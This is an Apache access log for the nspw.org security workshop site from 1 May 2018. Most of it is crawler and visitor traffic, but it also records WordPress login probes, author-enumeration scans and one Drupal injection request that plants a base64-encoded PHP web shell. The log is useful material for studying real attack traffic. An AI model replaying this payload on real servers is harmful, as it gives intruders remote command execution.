64.238.147.125 - - [01/May/2018:14:47:38 -0400] "GET /sites/nspw/images/nspw-logo-smaller.jpg HTTP/1.1" 404 4060 "-" "Java/1.8.0_162"
66.249.73.89 - - [01/May/2018:14:47:40 -0400] "GET /2009/proceedings/1996/nspw1996-millen.pdf HTTP/1.1" 200 80535 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
178.73.215.171 - - [01/May/2018:14:47:41 -0400] "GET / HTTP/1.0" 200 11184 "-" "-"
77.88.47.40 - - [01/May/2018:14:48:01 -0400] "GET /2002/papers.content HTTP/1.1" 200 6810 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:14:48:03 -0400] "GET /2009/proceedings/2007/nspw2007-gay.pdf HTTP/1.1" 200 265220 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
40.77.167.208 - - [01/May/2018:14:48:26 -0400] "GET /papers/1998/nspw1998-abrams.pdf HTTP/1.1" 200 735473 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
185.165.34.153 - - [01/May/2018:14:49:19 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
185.165.34.153 - - [01/May/2018:14:49:19 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [01/May/2018:14:50:29 -0400] "GET /papers/2003/nspw2003-duvarney.pdf HTTP/1.1" 200 1060171 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
69.162.124.227 - - [01/May/2018:14:50:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [01/May/2018:14:52:47 -0400] "GET /2009/proceedings/2001/?C=D;O=D HTTP/1.1" 200 4415 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:14:52:49 -0400] "GET /2009/proceedings/2008/?C=S;O=A HTTP/1.1" 200 941 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
222.217.32.245 - - [01/May/2018:14:53:29 -0400] "GET / HTTP/1.1" 200 6633 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
157.55.39.28 - - [01/May/2018:14:53:53 -0400] "GET /robots.txt HTTP/1.1" 200 4639 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.242 - - [01/May/2018:14:54:02 -0400] "GET /papers/1994/nspw1994-schneier.pdf HTTP/1.1" 200 337261 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
168.90.225.86 - - [01/May/2018:14:54:27 -0400] "GET /wp-login.php HTTP/1.1" 404 8176 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
168.90.225.86 - - [01/May/2018:14:54:28 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [01/May/2018:14:55:28 -0400] "GET / HTTP/1.1" 200 6607 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [01/May/2018:14:55:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [01/May/2018:14:57:00 -0400] "GET /papers/2000/nspw2000-templeton.pdf HTTP/1.1" 200 709129 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
123.206.212.37 - - [01/May/2018:14:59:42 -0400] "GET /wp-login.php HTTP/1.1" 404 7933 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
123.206.212.37 - - [01/May/2018:14:59:42 -0400] "GET /?author=1 HTTP/1.1" 200 3311 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
123.206.212.37 - - [01/May/2018:14:59:43 -0400] "GET /?author=2 HTTP/1.1" 200 3311 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
123.206.212.37 - - [01/May/2018:14:59:43 -0400] "GET /?author=3 HTTP/1.1" 200 3311 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
123.206.212.37 - - [01/May/2018:14:59:44 -0400] "GET /?author=4 HTTP/1.1" 200 3311 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
123.206.212.37 - - [01/May/2018:14:59:44 -0400] "GET /?author=5 HTTP/1.1" 200 3311 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
123.206.212.37 - - [01/May/2018:14:59:45 -0400] "GET /?author=6 HTTP/1.1" 200 3311 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
123.206.212.37 - - [01/May/2018:14:59:45 -0400] "GET /?author=7 HTTP/1.1" 200 3311 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
123.206.212.37 - - [01/May/2018:14:59:46 -0400] "GET /?author=8 HTTP/1.1" 200 3311 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
123.206.212.37 - - [01/May/2018:14:59:46 -0400] "GET /?author=9 HTTP/1.1" 200 3311 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
123.206.212.37 - - [01/May/2018:14:59:47 -0400] "GET /?author=10 HTTP/1.1" 200 3311 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
123.206.212.37 - - [01/May/2018:14:59:47 -0400] "GET /?author=11 HTTP/1.1" 200 3311 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
123.206.212.37 - - [01/May/2018:14:59:48 -0400] "GET /?author=12 HTTP/1.1" 200 3311 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
123.206.212.37 - - [01/May/2018:14:59:48 -0400] "GET /?author=13 HTTP/1.1" 200 3311 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
123.206.212.37 - - [01/May/2018:14:59:49 -0400] "GET /?author=14 HTTP/1.1" 200 3311 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
123.206.212.37 - - [01/May/2018:14:59:49 -0400] "GET /?author=15 HTTP/1.1" 200 3311 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
69.162.124.227 - - [01/May/2018:15:00:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
61.181.142.82 - - [01/May/2018:15:01:46 -0400] "GET / HTTP/1.1" 200 6104 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;)"
79.166.163.3 - - [01/May/2018:15:01:55 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "https://www.nspw.org/papers/2013/nspw2013-peisert.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
79.166.163.3 - - [01/May/2018:15:01:54 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 200 712039 "https://www.google.gr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
66.249.73.91 - - [01/May/2018:15:02:12 -0400] "GET /papers/2005/nspw2005-peisert.pdf HTTP/1.1" 200 3065110 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.89 - - [01/May/2018:15:02:25 -0400] "GET /papers/1997/nspw1997-cheung.pdf HTTP/1.1" 200 1446252 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.87 - - [01/May/2018:15:03:50 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [01/May/2018:15:03:25 -0400] "GET /papers/1994/nspw1994-ovchinnikov.pdf HTTP/1.1" 200 796314 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:15:04:08 -0400] "GET /2006/papers.shtml HTTP/1.1" 200 1428 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.89 - - [01/May/2018:15:05:25 -0400] "GET /papers/1999/nspw1999-michael.pdf HTTP/1.1" 200 596849 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
94.66.56.24 - - [01/May/2018:15:05:29 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "https://www.nspw.org/papers/2013/nspw2013-peisert.pdf" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
66.249.73.87 - - [01/May/2018:15:05:33 -0400] "GET /papers/2001/nspw2001-hosmer.pdf HTTP/1.1" 200 70429 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
69.162.124.227 - - [01/May/2018:15:05:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
94.66.56.24 - - [01/May/2018:15:05:29 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 200 712039 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
66.249.73.91 - - [01/May/2018:15:07:09 -0400] "GET /2009/proceedings/1999/nspw1999-lipson.pdf HTTP/1.1" 200 653276 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
179.234.145.171 - - [01/May/2018:15:07:50 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
179.234.145.171 - - [01/May/2018:15:07:51 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.53.205.134 - - [01/May/2018:15:09:33 -0400] "GET /wp-login.php HTTP/1.1" 404 7907 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.53.205.134 - - [01/May/2018:15:09:34 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [01/May/2018:15:09:39 -0400] "GET /papers/2001/nspw2001-brostoff.pdf HTTP/1.1" 200 1048585 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.87 - - [01/May/2018:15:09:43 -0400] "GET /papers/2002/nspw2002-marceau.pdf HTTP/1.1" 200 197896 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.89 - - [01/May/2018:15:10:07 -0400] "GET /papers/2007/nspw2007-chow.pdf HTTP/1.1" 200 420040 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
69.162.124.227 - - [01/May/2018:15:10:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [01/May/2018:15:12:01 -0400] "GET /papers/2012/docs/p15.pdf HTTP/1.1" 200 634532 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.87 - - [01/May/2018:15:12:12 -0400] "GET /2018/dates HTTP/1.1" 200 6272 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [01/May/2018:15:13:05 -0400] "GET /papers/2013-pre/waste-style.pdf HTTP/1.1" 404 8056 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.87 - - [01/May/2018:15:13:10 -0400] "GET /proceedings/2006/nspw2006-naegoe.pdf HTTP/1.1" 404 8085 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.87 - - [01/May/2018:15:14:39 -0400] "GET /papers/2000/nspw2000-foley.pdf HTTP/1.1" 200 591035 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.91 - - [01/May/2018:15:15:02 -0400] "GET /papers/1997/nspw1997-meadows.pdf HTTP/1.1" 200 431941 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
69.162.124.227 - - [01/May/2018:15:15:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [01/May/2018:15:15:52 -0400] "GET /2009/proceedings/1994/nspw1994-bertino.pdf HTTP/1.1" 200 542079 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.87 - - [01/May/2018:15:16:23 -0400] "GET /2009/proceedings/1998/nspw1998-kahn.pdf HTTP/1.1" 200 1162793 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
174.28.97.160 - - [01/May/2018:15:17:34 -0400] "GET /2017 HTTP/1.1" 200 7067 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:35 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2307 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:35 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 4434 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:35 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 746 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:35 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:35 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 662 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:35 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 756 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:35 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 629 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:35 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1062 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:35 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5370 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:35 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 771 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:35 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1445 "https://www.nspw.org/2017" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:35 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27601 "https://www.nspw.org/2017" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:35 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7372 "https://www.nspw.org/2017" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:36 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 2534 "https://www.nspw.org/2017" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:37 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 993 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:37 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 798 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:37 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3162 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:37 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3232 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:37 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 486 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:37 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 495 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:37 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 488 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:37 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 812 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:17:38 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "https://www.nspw.org/2017" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
66.249.73.87 - - [01/May/2018:15:17:37 -0400] "GET /papers/1998/nspw1998-greenwald.pdf HTTP/1.1" 200 1045292 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.89 - - [01/May/2018:15:17:38 -0400] "GET /2009/proceedings/1996/nspw1996-nelson.pdf HTTP/1.1" 200 384436 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
59.106.108.116 - - [01/May/2018:15:17:43 -0400] "HEAD /current/ HTTP/1.1" 200 3904 "-" "Hatena Antenna/0.5 (http://a.hatena.ne.jp/help)"
174.28.97.160 - - [01/May/2018:15:17:44 -0400] "GET /2017/accepted HTTP/1.1" 200 3524 "https://www.nspw.org/2017" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
59.106.108.116 - - [01/May/2018:15:17:47 -0400] "GET /current/ HTTP/1.1" 200 12401 "-" "Hatena Antenna/0.5 (http://a.hatena.ne.jp/help)"
174.28.97.160 - - [01/May/2018:15:18:01 -0400] "GET /2017/cfp HTTP/1.1" 200 5752 "https://www.nspw.org/2017/accepted" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:18:05 -0400] "GET /2017/accepted HTTP/1.1" 200 3367 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:18:15 -0400] "GET /proceedings HTTP/1.1" 200 3108 "https://www.nspw.org/2017/accepted" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:18:15 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 911 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
66.249.73.87 - - [01/May/2018:15:19:15 -0400] "GET /2009/proceedings/1998/nspw1998-jonsson.pdf HTTP/1.1" 200 670616 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
59.124.153.166 - - [01/May/2018:15:20:07 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6215 "-" "curl/7.47.0"
69.162.124.227 - - [01/May/2018:15:20:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [01/May/2018:15:20:35 -0400] "GET /papers/2007/nspw2007-backmatter.pdf HTTP/1.1" 200 65915 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
174.28.97.160 - - [01/May/2018:15:20:51 -0400] "GET /2017 HTTP/1.1" 200 3810 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
174.28.97.160 - - [01/May/2018:15:20:59 -0400] "GET /proceedings HTTP/1.1" 200 3104 "https://www.nspw.org/2017" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
66.249.73.87 - - [01/May/2018:15:21:00 -0400] "GET /2009/proceedings/1994/nspw1994-dobson.pdf HTTP/1.1" 200 710567 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.87 - - [01/May/2018:15:21:20 -0400] "GET /2009/proceedings/2008/nspw2008-bishop.pdf HTTP/1.1" 200 485862 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
5.9.94.207 - - [01/May/2018:15:21:23 -0400] "GET /2014/program HTTP/1.1" 200 17267 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 107) AppleWebKit/534.48.3 (KHTML like Gecko) Version/5.1 Safari/534.48.3"
88.198.43.207 - - [01/May/2018:15:21:24 -0400] "GET /node/70 HTTP/1.1" 200 13372 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36"
86.137.107.202 - - [01/May/2018:15:21:24 -0400] "GET /papers/2013/nspw2013-ard.pdf HTTP/1.1" 200 584793 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
222.217.32.245 - - [01/May/2018:15:21:54 -0400] "GET / HTTP/1.1" 200 6634 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
66.249.73.87 - - [01/May/2018:15:22:10 -0400] "GET /2009/proceedings/2010/nspw2010-maxion.pdf HTTP/1.1" 200 409311 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
51.38.12.13 - - [01/May/2018:15:22:34 -0400] "GET / HTTP/1.1" 200 12122 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
66.249.73.87 - - [01/May/2018:15:22:56 -0400] "GET /papers/2005/nspw2005-beznosov.pdf HTTP/1.1" 200 1827053 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.89 - - [01/May/2018:15:23:02 -0400] "GET /2005/PC/Oleg%20Kolesnikov.pdf HTTP/1.1" 404 8036 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.89 - - [01/May/2018:15:23:15 -0400] "GET /2009/proceedings/2007/nspw2007-solworth.pdf HTTP/1.1" 200 384581 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.87 - - [01/May/2018:15:23:38 -0400] "GET /2004/pre-proceedings/SadStu2004.pdf HTTP/1.1" 404 8063 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
199.59.150.180 - - [01/May/2018:15:24:28 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
176.88.0.179 - - [01/May/2018:15:24:59 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [01/May/2018:15:25:00 -0400] "GET /2005/PC/ritesh%20tiwari.pdf HTTP/1.1" 404 8032 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
176.88.0.179 - - [01/May/2018:15:25:01 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [01/May/2018:15:25:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
157.55.39.28 - - [01/May/2018:15:28:39 -0400] "GET /robots.txt HTTP/1.1" 200 4639 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
196.210.21.246 - - [01/May/2018:15:28:43 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
196.210.21.246 - - [01/May/2018:15:28:45 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
89.154.203.39 - - [01/May/2018:15:28:54 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
89.154.203.39 - - [01/May/2018:15:28:54 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
